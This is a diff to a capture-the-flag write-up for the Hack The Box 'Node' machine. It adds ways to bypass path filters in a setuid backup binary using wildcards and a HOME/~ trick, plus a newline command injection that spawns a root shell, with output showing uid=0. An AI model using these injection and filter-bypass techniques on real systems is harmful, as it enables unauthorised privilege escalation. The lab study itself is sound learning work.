@@ -186,9 +186,28 @@ WriteResult({ "nInserted" : 1 })
 
 ![image-20231216173936316](./Node.assets/image-20231216173936316.png)
 
-- bypass restrictions to get root flag: `/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root0`
+- bypass restrictions to get root flag:
+  - use `*` to bypass filters: `/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > root0`
+  - use `?` to bypass filters: `/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r??t/r??t.txt > root0`
+  - use configured environment variable `~` to bypass filters: `HOME=/root /usr/local/bin/backup -q '' ~ | base64 -d > root.zip`
+
 
 ![image-20231216174334759](./Node.assets/image-20231216174334759.png)
+
+- A newline in `system` will work just like it does in a Bash script, breaking commands. (**REF**: [HTB: Node | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/06/08/htb-node.html#beyond-root---unintended-roots))
+
+```bash
+tom@node:/$ backup -q "" '            
+> /bin/bash
+> '
+
+zip error: Nothing to do! (/tmp/.backup_1445476662)
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+root@node:/# id
+uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
+```
 
 ### backup buffer overflow
 
